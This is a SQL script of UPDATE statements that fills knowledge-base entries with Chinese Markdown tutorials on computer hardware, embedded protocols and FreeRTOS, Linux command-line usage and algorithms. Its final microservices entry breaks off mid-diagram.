-- ============================================================
-- 知识库内容扩充：21 条 kb_entries 的 content 字段
-- 将每条扩充为详细的 cnblogs 风格技术文章（实用、有代码、有表格、有实战）
-- 在 Supabase Dashboard → SQL Editor 中整段执行即可（可重复执行）
-- 注意：slug 列必须与 kb_entries 表中的值完全一致才会生效
-- ============================================================

-- ============ 硬件底层 ============

update public.kb_entries set content = $md$# 计算机的层次：从晶体管到一条指令

## 一、概述
计算机从最底层的物理器件到最高层的指令执行，是一层层抽象堆叠的结果。理解这条链路，才能解释"为什么 CPU 能跑代码"、"为什么提频越来越难"、"为什么流水线会有冒险"。本文从 MOSFET 出发，一路走到五级流水线，给出关键代码与图示。

## 二、MOSFET：电控开关
MOSFET（Metal-Oxide-Semiconductor Field-Effect Transistor）是现代芯片的基本开关。它有三个工作区：截止、线性、饱和。在数字电路里我们只用截止（关）和饱和（开）两个状态，对应 0/1。

- **NMOS**：栅极加正电压时导通，衬底 P 型，反型层连通源漏。
- **PMOS**：栅极加负电压时导通，衬底 N 型。
- **阈值电压 Vth** 决定开关边界；栅极与沟道间 SiO2 绝缘，输入阻抗极高。

## 三、CMOS 逻辑门
CMOS = 互补 MOS，把 PMOS 做上拉网络、NMOS 做下拉网络，静态功耗接近零（只在翻转瞬间有短路电流）。

- 非门：PMOS 接 VDD、NMOS 接 GND，栅极连一起。
- 与非门 NAND：两 NMOS 串联下拉、两 PMOS 并联上拉。
- **NAND/NOR 是万能门**，任意逻辑都能用它们堆出来。

动态功耗公式 `P ≈ α·C·V²·f`，这也是提频越来越难、改用多核的根本原因：电压不能无限降，频率上去功耗和发热平方级增长。

## 四、组合与时序电路
**组合逻辑**：输出只依赖当前输入。半加器、全加器、多路选择器 MUX、译码器。
**时序逻辑**：带状态。D 触发器在时钟边沿采样；建立时间 setup、保持时间 hold 是必须满足的约束。

全加器真值表：

| a | b | cin | sum | cout |
|---|---|---|---|---|
| 0 | 0 | 0 | 0 | 0 |
| 0 | 0 | 1 | 1 | 0 |
| 0 | 1 | 0 | 1 | 0 |
| 0 | 1 | 1 | 0 | 1 |
| 1 | 0 | 0 | 1 | 0 |
| 1 | 0 | 1 | 0 | 1 |
| 1 | 1 | 0 | 0 | 1 |
| 1 | 1 | 1 | 1 | 1 |

`sum = a ^ b ^ cin`；`cout = (a & b) | (b & cin) | (a & cin)`

## 五、Verilog 全加器示例
```verilog
module full_adder(
  input  a, b, cin,
  output sum, cout
);
  assign sum  = a ^ b ^ cin;
  assign cout = (a & b) | (b & cin) | (a & cin);
endmodule

// 4 位行波进位加法器
module ripple_add4(
  input  [3:0] a, b,
  input         cin,
  output [3:0] sum,
  output        cout
);
  wire [3:0] c;
  full_adder fa0(a[0], b[0], cin,  sum[0], c[0]);
  full_adder fa1(a[1], b[1], c[0], sum[1], c[1]);
  full_adder fa2(a[2], b[2], c[1], sum[2], c[2]);
  full_adder fa3(a[3], b[3], c[2], sum[3], cout);
endmodule
```
行波进位延迟随位数线性增长；超前进位（Carry-Lookahead）用并行逻辑把进位提前算出来，是性能优化的经典做法。

## 六、五级流水线数据通路
```
 IF → ID → EX → MEM → WB
 ┌──┐  ┌──┐  ┌──┐  ┌───┐  ┌──┐
 │PC│→│RF│→│ALU│→│MEM│→│RF│
 └──┘  └──┘  └──┘  └───┘  └──┘
        ↑                   │
        └───────────────────┘   (写回寄存器堆)
```
理想 CPI=1，IPC=1。每个时钟周期都有 5 条指令在不同级流动。

## 七、冒险（Hazard）
1. **结构冒险**：同周期同资源冲突，例：IF 和 MEM 都访问内存 → 哈佛结构（指令/数据分开）解决。
2. **数据冒险**：后指令需要前指令结果。forwarding（旁路）把 EX 出来的结果直接送回 ID 级；仍解决不了的插 stall 气泡。
3. **控制冒险**：分支跳转改变流向。分支预测（静态/动态、BTB、Tournament）、延迟槽、推测执行。

## 八、CPU 微架构对比

| 微架构 | 厂商 | 译码宽度 | 特点 |
|---|---|---|---|
| Golden Cove | Intel | 6 译码 | 复杂乱序、AMX 矩阵扩展 |
| Cortex-A78 | ARM | 多发射 | 移动主流，能效均衡 |
| Zen 4 | AMD | 译码+μop 缓存 | 高 IPC、3D V-Cache |
| Apple Firestorm | Apple | 8 译码 | 极宽、大 ROB，性能/能效双优 |

## 九、动手验证
- 用 Logisim / Digital 画一个全加器和 4 位计数器。
- 用 Verilator 做 5 级流水线核，跑冒泡排序。
- `cat /proc/cpuinfo`、CPU-Z 看本机微架构与流水线深度。
$md$ where slug = 'hw-layers-transistor-to-instruction';

update public.kb_entries set content = $md$# Cache 与存储层级：为什么程序会"不够快"

## 一、概述
"程序不够快"绝大多数时候不是 CPU 不够快，而是它在等内存。从寄存器到 HDD 速度差可达千万倍，存储层级 + Cache 的存在就是为了用最便宜的方式填上这个鸿沟。本文给出延迟对照、映射方式、写策略、伪共享等实战要点。

## 二、层级与量级延迟

| 层级 | 延迟量级 | 容量量级 |
|---|---|---|
| 寄存器 | <1 ns | 数十个 |
| L1 Cache | ~1 ns（4 cycles） | 32-64 KB |
| L2 | ~3-5 ns | 256 KB-1 MB |
| L3 | ~15 ns | 数 MB-几十 MB |
| DDR 内存 | ~80-100 ns | GB |
| NVMe SSD | ~10 μs | 百 GB-TB |
| SATA SSD | ~100 μs | 百 GB-TB |
| HDD | ~10 ms | TB |

注意 L1 比内存快两个数量级；SSD 比内存慢两个数量级。这是写代码必须时刻记住的尺度。

## 三、核心概念
- **时间局部性**：刚访问的数据很快再访问（循环变量）。
- **空间局部性**：相邻地址会被访问（数组顺序遍历）→ 按 cache line（通常 64B）取。
- **映射方式**：
  - 直接映射：每组 1 路，硬件简单但冲突率高。
  - n 路组相联：每组 n 路，主流选择（L1 通常 8 路）。
  - 全相联：每组全部行，命中率高但查找贵，只用于 TLB/小缓存。
- **写策略**：
  - write-through（WT）：同时写 Cache 和内存，简单但慢。
  - write-back（WB）：只写 Cache，dirty 位标记，替换时再写回，主流策略。
  - write-allocate：写缺失时先把块调入再写，常与 WB 搭配。
  - no-write-allocate：写缺失直接写内存，常与 WT 搭配。

## 四、缓存友好 vs 不友好循环
```c
// 友好：行优先遍历，命中率高
for (int i = 0; i < N; i++)
  for (int j = 0; j < N; j++)
    a[i][j] += 1;

// 不友好：列优先，每次跨 64B*N 字节，频繁 miss
for (int j = 0; j < N; j++)
  for (int i = 0; i < N; i++)
    a[i][j] += 1;
```
N=4096、int=4B 时，列优先每访问都跨 16KB，几乎全部 miss，性能可差 5-10 倍。

## 五、伪共享 False Sharing
多线程写不同变量，但变量落在同一 cache line 上，导致缓存行在核间反复失效：

```c
struct { int x, y; } s;   // x、y 同一 cache line
// 线程 A 写 s.x，线程 B 写 s.y → 频繁 invalidate
```
修复：用 `alignas(64)` 把变量分散到不同 cache line：
```c
struct { alignas(64) int x; alignas(64) int y; } s;
```

## 六、性能分析命令
```bash
# 查看 cache 层级
lscpu | grep -i cache
# 性能剖析
perf stat -e cache-misses,cache-references ./your_program
perf c2c report   # 找伪共享热点
```

## 七、工程启示
- 遍历多维数组按内存布局顺序（C 行优先、Fortran 列优先）。
- 热点数据结构紧凑、对齐；避免链表式随机跳转。
- Redis 本质就是用 DRAM 的速度对抗磁盘延迟，缓存层同理。
$md$ where slug = 'hw-cache-memory-hierarchy';

update public.kb_entries set content = $md$# 总线与接口速查：PCIe / USB / SATA / DDR

## 一、概述
计算机里数据在不同部件间流动靠总线与接口。速度、形态、协议差别巨大，选错接口会成瓶颈。本文给出主流总线版本/速率对照、协议分层与关键原理速查。

## 二、PCIe（高速串行，点对点，全双工）
- 通道 x1/x4/x8/x16；每通道速率（每方向）：
  - 3.0 ≈ 8 GT/s；4.0 ≈ 16 GT/s；5.0 ≈ 32 GT/s；6.0 ≈ 64 GT/s。
  - 编码 128b/130b（3.0 起），开销约 1.5%。
- PCIe 4.0 x16 单向理论 ≈ 31.5 GB/s；显卡、NVMe（常 x4）用它。
- 支持热插拔、SR-IOV 虚拟化直通、ASPM 省电。

分层协议：
```
应用/事务层（TLP）→ 数据链路层（ACK/NAK、CRC）→ 物理层（串行/解串、扰码）
```

## 三、USB

| 版本 | 标称速率 | 常见接口 |
|---|---|---|
| USB 2.0 | 480 Mbps | Micro-B / Type-C |
| USB 3.2 Gen1 | 5 Gbps | A / C（蓝色） |
| USB 3.2 Gen2 | 10 Gbps | C |
| USB4 v1.0 | 40 Gbps | Type-C |
| USB4 v2.0 | 80 Gbps | Type-C |
| Thunderbolt 3/4 | 40 Gbps | Type-C（DP Alt、PD 供电） |

USB 用差分信号（D+/D-，3.0 起 TX+/TX-），抗干扰强；Type-C 接口可正反插，CC 引脚识别方向与角色。

## 四、存储接口

| 接口 | 速率 | 协议 | 备注 |
|---|---|---|---|
| SATA III | 6 Gbps（实际 ~550 MB/s） | AHCI | 老盘标准 |
| SATA Express | 摆设 | - | 已淘汰 |
| NVMe over PCIe 4.0 x4 | ~7 GB/s | NVMe | 64K 队列 × 64K 命令 |
| NVMe over PCIe 5.0 x4 | ~14 GB/s | NVMe | 当前旗舰 SSD |
| U.2 / U.3 | 同 NVMe | NVMe | 服务器形态 |

NVMe 之所以快，不只因为 PCIe 带宽，更因为多队列并行（AHCI 只有 1 个队列、深度 32）。

## 五、DDR 内存
- **DDR4**：2133-3200 MT/s；**DDR5**：4800-8400 MT/s，片内 ECC、双 32B 子通道。
- **预取原理**：DDR 每次内部阵列取数宽度远大于外部数据宽度，靠 prefetch（DDR4 8n、DDR5 16n）用相对慢的阵列核频率驱动高频 I/O。
- **通道**：单通道 64b（DDR5 双 32b），双通道带宽翻倍；插满同色槽位。
- **ECC**：服务器内存，纠正单比特错误、检测双比特，避免软错误导致数据损坏。
- **延迟**：tCAS/tRCD/tRP/tRAS 四参数决定随机访问延迟，时序紧≠带宽高。

## 六、显示与其它
- **DP 2.0 UHBR20**：80 Gbps，可上 8K60/4K240；DSC 压缩后再上。
- **HDMI 2.1**：48 Gbps，FRL 三通道。
- **I2C/SPI/UART**：嵌入式低速总线，详见嵌入式分类。
- **CXL**：基于 PCIe 5.0 的缓存一致性协议，服务器内存池化新方向。

## 七、速查口诀
- 显卡 / NVMe → PCIe（看 lane 数和代数）。
- 键盘鼠标 → USB 2.0 即可；外存 / 视频 → USB 3.x / USB4。
- 内存选型看 MT/s + 通道数 + 时序，服务器必上 ECC。
$md$ where slug = 'hw-bus-interfaces-cheatsheet';

-- ============ 嵌入式 ============

update public.kb_entries set content = $md$# 裸机开发第一站：寄存器、时钟与启动流程

## 一、概述
裸机开发没有操作系统，直接面对硬件。第一关就是搞懂"上电到 main() 之间发生了什么"，以及如何用寄存器和时钟树把一颗 MCU 跑起来。本文以 STM32/GD32（Cortex-M）为例。

## 二、上电启动流程（Cortex-M）
1. 从向量表偏移 0x00 取**初始 MSP**（主栈指针）。
2. 偏移 0x04 取 **Reset_Handler** 地址。
3. Reset_Handler（汇编 `startup_stm32xxx.s`）：拷贝 .data 段到 SRAM、.bss 段清零、调用 `SystemInit` 配时钟。
4. 跳转 `__libc_init_array`（运行 C 库初始化）→ `main()`。

向量表示例：
```c
__attribute__((section(".isr_vector")))
void (* const g_pfnVectors[])(void) = {
  (void (*)(void))0x20008000,  // 初始 MSP
  Reset_Handler,               // 复位
  NMI_Handler,                 // NMI
  HardFault_Handler,           // 硬件错误
  // ... 其它中断
};
```

## 三、时钟树配置
STM32F4 上电默认 HSI 16MHz，要跑满 168MHz 必须切 HSE + PLL：

```c
// HAL 库版
RCC_OscInitTypeDef osc = {0};
osc.OscType = RCC_OSCILLATORTYPE_HSE;
osc.HSEState = RCC_HSE_ON;
osc.PLL.PLLState = RCC_PLL_ON;
osc.PLL.PLLSource = RCC_PLLSOURCE_HSE;
osc.PLL.PLLM = 8;   // 8MHz / 8 = 1MHz
osc.PLL.PLLN = 336; // 1MHz * 336 = 336MHz VCO
osc.PLL.PLLP = RCC_PLLP_DIV2;  // 168MHz SYSCLK
osc.PLL.PLLQ = 7;   // 48MHz USB
HAL_RCC_OscConfig(&osc);

RCC_ClkInitTypeDef clk = {0};
clk.ClockType = RCC_CLOCKTYPE_SYSCLK | RCC_CLOCKTYPE_HCLK |
                RCC_CLOCKTYPE_PCLK1 | RCC_CLOCKTYPE_PCLK2;
clk.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
clk.AHBCLKDivider = RCC_SYSCLK_DIV1;    // HCLK=168
clk.APB1CLKDivider = RCC_HCLK_DIV4;    // PCLK1=42（最大）
clk.APB2CLKDivider = RCC_HCLK_DIV2;    // PCLK2=84
HAL_RCC_ClockConfig(&clk, FLASH_LATENCY_5);
```

口诀：HSE→PLLM 分频→PLLN 倍频→PLLP 分频得 SYSCLK；AHB 不分；APB1 ≤42、APB2 ≤84。

## 四、寄存器操作三种写法
**1. 直接指针 + volatile**（最底层）：
```c
#define RCC_AHB1ENR (*(volatile uint32_t*)0x40023830)
#define GPIOA_MODER  (*(volatile uint32_t*)0x40020000)
RCC_AHB1ENR |= (1<<0);             // 使能 GPIOA 时钟
GPIOA_MODER &= ~(3<<(5*2));        // 清 PA5 模式
GPIOA_MODER |=  (1<<(5*2));         // 输出模式
```

**2. CMSIS 结构体**（厂商封装好）：
```c
RCC->AHB1ENR |= RCC_AHB1ENR_GPIOAEN;
GPIOA->MODER &= ~GPIO_MODER_MODE5;
GPIOA->MODER |=  GPIO_MODER_MODE5_0;
GPIOA->BSRR = GPIO_BSRR_BS5;        // 置位（点灯）
```

**3. HAL 库**（跨芯片兼容）：
```c
__HAL_RCC_GPIOA_CLK_ENABLE();
HAL_GPIO_WritePin(GPIOA, GPIO_PIN_5, GPIO_PIN_SET);
```

## 五、位操作技巧
```c
// 把某位置 1
reg |= (1 << n);
// 把某位清 0
reg &= ~(1 << n);
// 翻转某位
reg ^= (1 << n);
// 读某位
bit = (reg >> n) & 1;
// 一次改 4 位（MODER 两位一组）
reg = (reg & ~(3 << (n*2))) | (val << (n*2));
```
裸机代码常展开成位操作以省 Flash、避函数调用开销。

## 六、启动失败排查清单
- 一上电就 HardFault：检查 MSP 地址是否在 RAM 范围、向量表是否正确链接。
- 时钟起不来：HSE 外部晶振没起振，查焊接、负载电容、容差。
- 闪灯不闪：忘了开 GPIO 时钟、模式配错、引脚被复用占用。
- SWD 连不上：BOOT0=1 从系统存储启动；复位时序；引脚被改成模拟。

## 七、实战建议
- 必看两本手册：**Reference Manual**（寄存器细节）+ **Datasheet**（引脚/电气）。
- 先用 ST-LINK Utility 看能否连接，再看 Option Bytes。
- 时钟和中断是裸机一切的地基，搞透了再上 RTOS。
$md$ where slug = 'emb-bare-metal-register-boot';

update public.kb_entries set content = $md$# 嵌入式通信协议对比：UART / I2C / SPI / CAN

## 一、四种协议速查对比

| 维度 | UART | I2C | SPI | CAN |
|---|---|---|---|---|
| 线数 | 2（TX/RX） | 2（SDA/SCL） | 3-4（MOSI/MISO/SCK/CS） | 2（CANH/CANL） |
| 双工 | 全双工 | 半双工 | 全双工 | 半双工 |
| 拓扑 | 点对点 | 多主多从 | 一主多从 | 多主对等 |
| 速率 | 常见 9600-3M | 100k/400k/3.4M | 几十 Mbps | 1Mbps（CAN-FD 8Mbps） |
| 应答 | 无（靠校验位） | ACK 位 | 无（可选 CRC） | ACK + CRC15 |
| 距离 | 较近 | 板内 | 板内 | 远（百米级） |
| 典型场景 | 调试串口/蓝牙 | 传感器/OLED | Flash/SD/屏 | 汽车工业 |

## 二、UART
异步、靠波特率约定。每帧 `起始位(0) + 数据 5-9 位 + 校验位 + 停止位(1)`。
```
 ___     ___ ___ ___ ___ ___ ______
   |___|_0_|_1_|_2_|_3_|_4_|_5_|_6_|_7_|_P_|_stop_|
   起始                                     停止
```
常见坑：波特率误差 >3% 会错位；长线 / 干扰加 RS485 差分。

## 三、I2C
两线开漏，需上拉电阻（4.7k 常见）。地址 7 位 + R/W 位：
```
SCL ─────┐   ┌──┐   ┌──┐   ┌──┐   ┌────
          │   │  │   │  │   │  │
SDA ──┐   └──┘   └──┘   └──┘   └──────
       │ START              STOP
       └ Addr(7) R/W ACK Data ACK ...
```
- **ACK**：每 9 个 SCL 周期，从机拉低 SDA 表示收到。
- **地址冲突**：同总线多设备用同地址 → 改地址或加多路复用器。
- 多主时仲裁：谁先把 SDA 拉低谁赢，输的退出。

## 四、SPI
主从、同步、全双工。四线：MOSI/MISO/SCK/CS。CS 拉低选中从机。
四种模式由 CPOL（时钟极性）+ CPHA（时钟相位）决定：
- Mode0：CPOL=0 CPHA=0（最常见，上升沿采样）。
- Mode3：CPOL=1 CPHA=1（也常用，下降沿采样）。

时序示意：
```
CS  ─┐                      ┌────
      \______________________/
SCK    _   _   _   _   _   _    _
      | |_| |_| |_| |_| |_| |_____|
MOSI  D7  D6  D5  D4  D3  D2 ...
```

## 五、STM32 HAL 读 I2C 传感器示例
```c
// 例：MPU6050，0x68 设备地址
#define MPU_ADDR (0x68 << 1)   // HAL 要 8 位地址（左移 1）

uint8_t whoami;
HAL_StatusTypeDef st;
// 写寄存器指针到 0x75
uint8_t reg = 0x75;
st = HAL_I2C_Master_Transmit(&hi2c1, MPU_ADDR, &reg, 1, 100);
if (st != HAL_OK) Error_Handler();
// 读 1 字节
st = HAL_I2C_Master_Receive(&hi2c1, MPU_ADDR, &whoami, 1, 100);
// whoami 应为 0x68

// 寄存器读写封装
uint8_t i2c_read_reg(uint8_t reg) {
  uint8_t v;
  HAL_I2C_Mem_Read(&hi2c1, MPU_ADDR, reg, 1, &v, 1, 100);
  return v;
}
void i2c_write_reg(uint8_t reg, uint8_t val) {
  HAL_I2C_Mem_Write(&hi2c1, MPU_ADDR, reg, 1, &val, 1, 100);
}
```
坑：HAL I2C 死锁在 BUSY 标志 → 复位前手动 Clock 9 次清从机状态。

## 六、CAN
差分两线（CANH/CANL），多主对等，仲裁靠 ID 优先级（ID 越小优先级越高，显性 0 覆盖隐性 1）。
帧结构：`SOF + 标识符(11/29位) + RTR + 控制 + 数据0-8B + CRC15 + ACK + EOF`。
CAN-FD 数据段到 64B、速率到 8Mbps。

## 七、选型口诀
- 板内点对点慢速传感器 → I2C（线少、地址清楚）。
- 板内高速 Flash/屏/ADC → SPI（吞吐大）。
- 长距离 / 多机 / 强干扰 → CAN（差分 + 仲裁 + CRC，工业汽车首选）。
- 调试串口 / 蓝牙模块 → UART（最简单）。
$md$ where slug = 'emb-comm-protocols-uart-i2c-spi-can';

update public.kb_entries set content = $md$# FreeRTOS 核心：任务/调度/IPC

## 一、任务状态机
FreeRTOS 任务在四个状态间切换：

```
        创建
         │
         ▼
   ┌──────────┐  事件触发   ┌──────────┐
   │  Ready   │ ─────────→ │ Running  │
   │  就绪    │             │  运行    │
   └──────────┘ ←───────── └──────────┘
         ▲   调度                │
         │                       │ 阻塞/挂起
         │                       ▼
         │                  ┌──────────┐
         └──────────────────│ Blocked  │
              事件/超时唤醒   │  阻塞    │
                            └──────────┘
                                 │ 挂起
                                 ▼
                            ┌──────────┐
                            │Suspended │
                            │  挂起    │
                            └──────────┘
```

## 二、优先级抢占调度
- 调度器永远选 Ready 链中优先级最高的运行。
- 同优先级用时间片轮转（tick 中断切换）。
- 高优先级任务就绪立即抢占低优先级任务（不等时间片）。
- 数值越大优先级越高（与 Linux nice 相反）。

## 三、任务创建
```c
void vTaskLed(void *pv) {
  for (;;) {
    HAL_GPIO_TogglePin(GPIOA, GPIO_PIN_5);
    vTaskDelay(pdMS_TO_TICKS(500));
  }
}

// 栈大小以字为单位，实际字节数 = N * 4
xTaskCreate(vTaskLed, "led", 128, NULL, 2, NULL);
vTaskStartScheduler();
```
栈大小经验：LED 1xx 字、用到 printf/LwIP 至少 512-1024 字。`uxTaskGetStackHighWaterMark` 查剩余水位。

## 四、队列通信
```c
QueueHandle_t xQueue = xQueueCreate(10, sizeof(uint32_t));

// 发送端任务
void vSender(void *pv) {
  uint32_t v = 0;
  for (;;) {
    xQueueSend(xQueue, &v, portMAX_DELAY);
    v++;
    vTaskDelay(1);
  }
}

// 接收端任务
void vReceiver(void *pv) {
  uint32_t got;
  for (;;) {
    if (xQueueReceive(xQueue, &got, portMAX_DELAY) == pdPASS) {
      printf("got %lu\n", got);
    }
  }
}
```
队列拷贝传值，不要塞大结构（用指针或流缓冲 StreamBuffer）。中断里必须用 `xQueueSendFromISR` 并做 `portYIELD_FROM_ISR`。

## 五、信号量与互斥量
```c
SemaphoreHandle_t xSem = xSemaphoreCreateBinary();
xSemaphoreGive(xSem);
if (xSemaphoreTake(xSem, pdMS_TO_TICKS(100)) == pdPASS) { /* ... */ }

// 互斥量：带优先级继承，防优先级反转
SemaphoreHandle_t xMutex = xSemaphoreCreateMutex();
xSemaphoreTake(xMutex, portMAX_DELAY);
// 临界资源
xSemaphoreGive(xMutex);
```
- **二值/计数信号量**：用于同步、资源计数。
- **互斥量 Mutex**：用于保护临界资源，带优先级继承，**不能用在中断**。

## 六、临界区保护
```c
// 短临界区：关中断
taskENTER_CRITICAL();
// ...
taskEXIT_CRITICAL();

// 中断内：屏蔽特定优先级
UBaseType_t ux = taskENTER_CRITICAL_FROM_ISR();
// ...
taskEXIT_CRITICAL_FROM_ISR(ux);
```
关中断时间应 < 几十 μs，否则丢中断、影响实时性。

## 七、常见死锁场景与排查
**优先级反转**：低优先级持锁，高优先级等锁，中被优先级任务抢 → 高优先级被无限拖延。
解决：用 Mutex（自动优先级继承）代替二值信号量。

**死锁**：任务 A 持锁 1 等锁 2，任务 B 持锁 2 等锁 1。
解决：约定锁的全局顺序；用 `xSemaphoreTake` 带超时；监控 `eTasksGetState`。

排查工具：
- `vTaskList` / `uxTaskGetSystemState`：看每个任务状态与栈水位。
- `vTaskGetRunTimeStats`：CPU 占用统计。
- Tracealyzer / SystemView：可视化时序。
- `configCHECK_FOR_STACK_OVERFLOW=2`：栈溢出钩子。

## 八、配置要点（FreeRTOSConfig.h）
- `configMAX_PRIORITIES`：留余量，常用 7-32。
- `configTICK_RATE_HZ`：1k 常见，实时性要求高可上 10k。
- `configMINIMAL_STACK_SIZE`：空闲任务栈。
- `configUSE_PREEMPTION=1`、`configUSE_TIME_SLICING=1`。
- `configUSE_MUTEXES=1`、`configUSE_RECURSIVE_MUTEXES=1`（按需）。
$md$ where slug = 'emb-freertos-task-scheduler-ipc';

-- ============ 软件工程 ============

update public.kb_entries set content = $md$# Linux 命令行肌肉记忆清单

## 一、文件操作
```bash
# 快速查看
ls -lah --group-directories-first    # 人性化、目录在前
ls -lhS                              # 按大小排
du -sh * | sort -h                   # 找大目录
df -hT                              # 查挂载与剩余

# 查找
find . -name "*.go" -not -path "./vendor/*"
find . -type f -mtime -7            # 7 天内修改
find . -size +100M -exec ls -lh {} \;
locate -i nginx.conf                # 索引查找（先 updatedb）

# 复制 / 同步
rsync -avzP --delete src/ user@host:/dst/   # 带进度、断点续传、删除多余
cp -av x y                            # 保留属性
```

## 二、文本处理
```bash
# grep 三宝
grep -rn "TODO" --include="*.go" .
grep -E "err|panic|fatal" app.log
grep -v "^#" file | grep -v "^$"      # 去注释与空行

# awk 经典
awk '{sum+=$1} END {print sum}' nums.txt        # 求和
awk -F: '$3>=1000 {print $1,$3}' /etc/passwd    # UID>=1000 的用户
awk '{s[$1]+=$2} END {for(k in s) print k,s}'   # 按 $1 分组求和

# sed 替换
sed -i 's/old/new/g' *.go
sed -i '/^#/d; /^$/d' file        # 删注释与空行
sed -n '10,20p' file              # 看第 10-20 行

# 综合管线：找出日志里 Top10 IP
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head
```

## 三、进程管理
```bash
ps aux --sort=-%cpu | head        # 按 CPU 排
ps -ef --forest                    # 树形看父子
top -c / htop                      # 交互式
pidstat 1                          # 每秒进程 CPU/IO

# 信号
kill -9 <pid>                      # SIGKILL 强杀
kill -HUP <pid>                    # 重载配置
pkill -f "node app.js"             # 按命令行匹配

# 后台
nohup ./app > app.log 2>&1 &
disown -h %1                       # 脱离 shell
```

## 四、网络
```bash
# 连接
ss -tnlp                           # 看 TCP 监听（替代 netstat）
ss -tn state established '( dport = :443 )'   # 443 已连
lsof -i:8080                       # 谁占了 8080
lsof -nP -iTCP -sTCP:LISTEN

# 探测
ping -c3 1.1.1.1
mtr -rwz 8.8.8.8                    # 持续路由追踪
tcpdump -i any -nn port 443 and host 1.2.3.4 -w out.pcap
dig +short A example.com
curl -w "@curl-fmt" -o /dev/null -s https://example.com
# curl-fmt 文件内容：time_namelookup: %{time_namelookup}\ntime_total: %{time_total}\n
```

## 五、磁盘与 IO
```bash
# 容量
df -hT | grep -v tmpfs
du -xhd1 | sort -h                 # 当前目录一层，跨设备

# IO 性能
iostat -xm 2                       # 每 2s 一次，看 %util、await
iotop -oPa                         # 找 IO 大户

# 文件系统
lsblk -f                           # 块设备与文件系统
mount | column -t
findmnt /mnt/data
```

## 六、系统排查
```bash
# CPU
uptime                             # 1/5/15 分钟负载
mpstat 1 5                         # 每核每秒

# 内存
free -h
vmstat 1 5                         # si/so 交换活动
cat /proc/meminfo | grep -iE "MemFree|Cached|Swap"

# 系统调用 / 函数
strace -f -e trace=openat,read,write -p <pid>
ltrace -p <pid>
perf top -p <pid>                  # 热点函数

# 崩溃与日志
dmesg -T | tail
journalctl -u nginx -f             # 跟踪 unit 日志
journalctl --since "10 min ago" -p err
```

## 七、小工具速记
- `xxd` / `hexdump -C`：十六进制查看。
- `file`：识别文件类型。
- `column -t`：表格对齐。
- `jq`：JSON 处理。`jq '.[] | select(.age>30)' a.json`。
- `watch -n1 'ss -tn'`：每秒刷新。
- `tldr <cmd>`：命令速查（需安装）。
$md$ where slug = 'sw-linux-cli-muscle-memory';

update public.kb_entries set content = $md$# 数据结构与算法：按面试/实战权重梳理

## 一、权重与考察热度

| 主题 | 面试频率 | 工程频率 | 优先级 |
|---|---|---|---|
| 数组/双指针/滑动窗口 | ★★★★★ | ★★★★★ | P0 |
| 链表 | ★★★★ | ★★ | P1 |
| 哈希表 | ★★★★★ | ★★★★★ | P0 |
| 二叉树/DFS/BFS | ★★★★★ | ★★★ | P0 |
| 二分查找 | ★★★★ | ★★★ | P0 |
| 排序 | ★★★ | ★★ | P1 |
| 堆/优先队列 | ★★★ | ★★★★ | P1 |
| 图 BFS/DFS/并查集 | ★★★ | ★★ | P1 |
| 动态规划 | ★★★★ | ★★ | P1 |
| 字符串 KMP/Manacher | ★★ | ★ | P2 |

## 二、二分查找
```python
def bin_search(nums, target):
    lo, hi = 0, len(nums) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        if nums[mid] == target:
            return mid
        elif nums[mid] < target:
            lo = mid + 1
        else:
            hi = mid - 1
    return -1

# 左边界：找第一个 >= target
def lower_bound(nums, target):
    lo, hi = 0, len(nums)
    while lo < hi:
        mid = (lo + hi) // 2
        if nums[mid] < target: lo = mid + 1
        else: hi = mid
    return lo
```
关键：**循环不变量**——`[lo, hi]` 始终包含答案；`mid` 的取法与边界收缩要对齐。

## 三、BFS / DFS
```python
from collections import deque

def bfs(start, adj):
    q = deque([start])
    seen = {start}
    while q:
        u = q.popleft()
        for v in adj[u]:
            if v not in seen:
                seen.add(v); q.append(v)

def dfs(start, adj):
    seen = set(); stk = [start]
    while stk:
        u = stk.pop()
        if u in seen: continue
        seen.add(u)
        for v in adj[u]:
            if v not in seen: stk.append(v)
```
BFS 求最短路径（无权）、层序；DFS 求连通分量、拓扑排序、回溯搜索。

## 四、快速排序
```python
def qsort(a, lo, hi):
    if lo >= hi: return
    pivot = a[(lo+hi)//2]
    i, j = lo, hi
    while i <= j:
        while a[i] < pivot: i += 1
        while a[j] > pivot: j -= 1
        if i <= j:
            a[i], a[j] = a[j], a[i]
            i += 1; j -= 1
    qsort(a, lo, j)
    qsort(a, i, hi)
```
平均 O(nlogn)、最坏 O(n²)；工程上用 `sorted`（Timsort，稳定 O(nlogn)）。

## 五、LRU Cache
```python
from collections import OrderedDict

class LRUCache:
    def __init__(self, cap):
        self.cap = cap
        self.od = OrderedDict()
    def get(self, key):
        if key not in self.od: return -1
        self.od.move_to_end(key)
        return self.od[key]
    def put(self, key, val):
        if key in self.od:
            self.od.move_to_end(key)
        self.od[key] = val
        if len(self.od) > self.cap:
            self.od.popitem(last=False)  # 弹最老
```
手写版：双向链表 + 哈希表，O(1) get/put。Redis / 浏览器缓存都基于它。

## 六、动态规划
**三步**：定义状态 → 推转移方程 → 设初值/边界。
经典：背包、最长公共子序列、最长递增子序列（LIS 用二分优化到 O(nlogn)）。

```python
# LIS O(nlogn)
import bisect
def lis(a):
    tails = []
    for x in a:
        i = bisect.bisect_left(tails, x)
        if i == len(tails): tails.append(x)
        else: tails[i] = x
    return len(tails)
```

## 七、时间空间复杂度速查

| 算法 | 平均 | 最坏 | 空间 |
|---|---|---|---|
| 二分 | O(logn) | O(logn) | O(1) |
| 快排 | O(nlogn) | O(n²) | O(logn) |
| 归并 | O(nlogn) | O(nlogn) | O(n) |
| 堆排 | O(nlogn) | O(nlogn) | O(1) |
| BFS/DFS | O(V+E) | O(V+E) | O(V) |
| 哈希查找 | O(1) | O(n) | O(n) |
| 动规 | 看状态数 | 同 | 看状态数 |

## 八、实战经验
- **先想暴力，再优化**：面试允许从 O(n²) 起步。
- **画图找规律**：链表/树/矩阵题先画小样例。
- **空间换时间**：哈希表是万金油。
- **复杂度口诀**：1e8 操作约 1 秒，n=10⁵ 时 O(n²) 超时。
- **工程上**：用标准库即可，手写只在面试或性能热点。
$md$ where slug = 'sw-dsa-by-priority';

update public.kb_entries set content = $md$# 微服务架构图鉴：本博客的技术底座

## 一、Spring Cloud 组件全景
```
                  ┌──────────────┐
                  │   客户端     │  Web / App
                  └──────┬───────┘
                         │ HTTPS
                  ┌──────▼───────┐
                  │  API Gateway │  Spring Cloud Gateway
                  │  路由/限流/鉴权 │
                  └──────┬───────┘
                         │
